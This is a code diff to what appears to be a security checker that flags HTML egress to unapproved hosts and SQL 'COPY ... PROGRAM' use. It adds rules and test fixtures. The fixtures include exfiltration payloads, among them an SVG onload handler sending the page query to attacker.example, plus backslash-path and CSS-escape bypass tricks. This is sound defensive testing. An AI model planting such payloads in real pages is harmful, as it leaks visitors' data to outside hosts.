@@ -574,13 +574,13 @@ function hasSqlFalseGucSetting(content) {
 function hasUnapprovedHtmlEgress(content, approvedHosts) {
   const activeTags = new Set(["script", "form", "iframe", "frame", "audio", "video", "source", "track", "object", "embed", "base", "style"]);
   const urlAttributes = new Set(["src", "href", "xlink:href", "action", "formaction", "poster", "data", "cite", "background"]);
+  const deliveryOrigin = "https://www.meccha-iiyatsu.com";
   const isApprovedResource = (value) => {
     const candidate = value.trim();
     if (!candidate) return true;
-    if (/^(?:#|\/(?!\/)|\.\.?\/)/.test(candidate)) return true;
     if (/^data:image\//i.test(candidate)) return true;
     try {
-      const url = new URL(candidate);
+      const url = new URL(candidate, deliveryOrigin);
       return url.protocol === "https:" && approvedHosts.has(url.hostname.toLowerCase());
     } catch {
       return false;
@@ -597,7 +597,7 @@ function hasUnapprovedHtmlEgress(content, approvedHosts) {
     for (const attribute of attributes) {
       const name = attribute.name.toLowerCase();
       if (name.startsWith("on")) rejected = true;
-      if (name === "style" && /(?:url\s*\(|@import)/i.test(attribute.value)) rejected = true;
+      if (name === "style" && (attribute.value.includes("\\") || /(?:url\s*\(|@import)/i.test(attribute.value))) rejected = true;
       if (urlAttributes.has(name) && !isApprovedResource(attribute.value)) rejected = true;
       if (name === "srcset" && !resourceListIsApproved(attribute.value)) rejected = true;
     }
@@ -662,7 +662,8 @@ function hasAiRuntimeBoundary(content, path = "") {
   if (sqlStatement.length > 0) sqlStatements.push(sqlStatement);
   const hasSqlServerProgramCapability = sqlStatements.some((statement) => {
     const identifiers = statement.filter((token) => token.type === "identifier").map((token) => token.value.replace(/^quoted:/, ""));
-    return identifiers[0] === "copy" && identifiers.includes("program");
+    if (identifiers[0] !== "copy") return false;
+    return identifiers.some((identifier, index) => ["from", "to"].includes(identifier) && identifiers[index + 1] === "program");
   });
   const hasAdjacentSqlStrings = normalizedPath.endsWith(".sql") && /(?:^|[\s(])(?:E|U&)?'(?:[^']|'')*'\s*(?:\r?\n|\r)[ \t]*(?:E|U&)?'/im.test(sqlLexicalContent);
   const approvedEgressHosts = new Set([
@@ -883,6 +884,8 @@ for (const fixture of [
   { content: '<script>new Image().src = new URLSearchParams(location.search).get("u")</script>', path: "apps/brand-site/public/dynamic-egress.html" },
   { content: '<svg onload="location=\'//attacker.example/\'+location.search"></svg>', path: "apps/brand-site/public/svg-event-egress.html" },
   { content: '<img src="//attacker.example/pixel">', path: "apps/brand-site/public/protocol-relative-egress.html" },
+  { content: '<img src="/\\\\api.groq.com/openai/v1/pixel">', path: "apps/brand-site/public/backslash-resource-egress.html" },
+  { content: '<div style="background:u\\\\72l(//api.groq.com/pixel)"></div>', path: "apps/brand-site/public/css-escape-egress.html" },
   { content: "select create_ai_adapter();", path: "supabase/migrations/ai-adapter.sql" }
 ]) {
   if (!hasAiRuntimeBoundary(fixture.content, fixture.path)) {
@@ -896,7 +899,9 @@ for (const fixture of [
   { content: "perform set_config('app.manual_publish_context', 'on', true);", path: "supabase/migrations/99999999999999-approved-transaction-context.sql" },
   { content: "set standard_conforming_strings = on;", path: "supabase/migrations/99999999999999-safe-standard-strings.sql" },
   { content: "do $$ begin set standard_conforming_strings = on; end $$;", path: "supabase/migrations/99999999999999-safe-do-standard-strings.sql" },
-  { content: "copy safe_table to stdout; select program from allowed_table;", path: "supabase/migrations/99999999999999-safe-copy-stdout.sql" }
+  { content: "copy safe_table to stdout; select program from allowed_table;", path: "supabase/migrations/99999999999999-safe-copy-stdout.sql" },
+  { content: "copy safe_table (program) to stdout;", path: "supabase/migrations/99999999999999-safe-copy-program-column.sql" },
+  { content: "copy (select program from safe_table) to stdout;", path: "supabase/migrations/99999999999999-safe-copy-program-select.sql" }
 ]) {
   if (hasAiRuntimeBoundary(fixture.content, fixture.path)) {
     errors.push(`AI absence safe SQL fixture was rejected: ${fixture.path}`);
